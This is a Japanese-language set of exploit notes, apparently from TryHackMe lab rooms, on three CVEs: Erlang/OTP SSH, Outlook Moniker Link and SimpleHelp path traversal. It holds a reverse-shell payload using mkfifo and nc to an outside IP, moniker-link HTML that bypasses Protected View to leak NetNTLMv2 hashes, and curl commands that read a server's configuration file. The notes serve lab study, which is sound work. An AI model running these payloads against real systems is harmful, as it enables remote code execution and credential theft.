# CVE

## CVE-2025-32433

https://tryhackme.com/room/erlangotpsshcve202532433

https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py

- Erlang/OTP SSH
- 修正：OTP-27.3.3, OTP-26.2.5.11, or OTP-25.3.2.20.
- 認証情報不要

上記 URL の PoC は無害なファイルを作るだけ。

```
file:write_file("/lab.txt", <<"pwned">>)
```

os::cmd を使うことで、任意のコードを実行できる。

```
command='os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6666 >/tmp/f").'
```

## CVE-2024-21413（Moniker Link）

https://tryhackme.com/room/monikerlink

https://github.com/CMNatic/CVE-2024-21413

- Outlook の脆弱性で、Windows netNTLMv2 hash を盗む。
- アプリケーションを指定するリンクをモニカーリンクという。
- ユーザーがリンクをクリックしたら、ローカル認証情報が指定した IP に送信される。

```sh
# 通常のモニカーリンクは保護ビューにブロックされる
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

# 「!」文字を入れて、保護ビューをバイパスするリンク
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

## CVE-2024-57727 (SimpleHelp)

https://tryhackme.com/room/simplehelpcve202457727

- SimpleHelp <= v5.5.7
- パストラバーサルの脆弱性
- この他に、CVE-2024-57726、CVE-2024-57728 もある

```sh
git clone https://github.com/imjdl/CVE-2024-57727
cd CVE-2024-57727

# 脆弱性があるかどうか確認
python3 poc.py http://MACHINE_IP
```

Windows 用

```sh
# --path-as-is により、.. が正規化されなくなる
curl --path-as-is http://MACHINE_IP/toolbox-resource/../resource1/../../configuration/serverconfig.xml
```

Linux 用

```sh
# Linuxの場合、resource1 の部分を有効なディレクトリ名にする必要がある
curl --path-as-is http://MACHINE_IP/toolbox-resource/../secmsg/../../configuration/serverconfig.xml
```

secmsg 以外の候補 `alertsdb, backups, branding, history, html, notifications, recordings, remotework, simulations, sslconfig, techprefs, templates, toolbox, toolbox-resources, translations
`
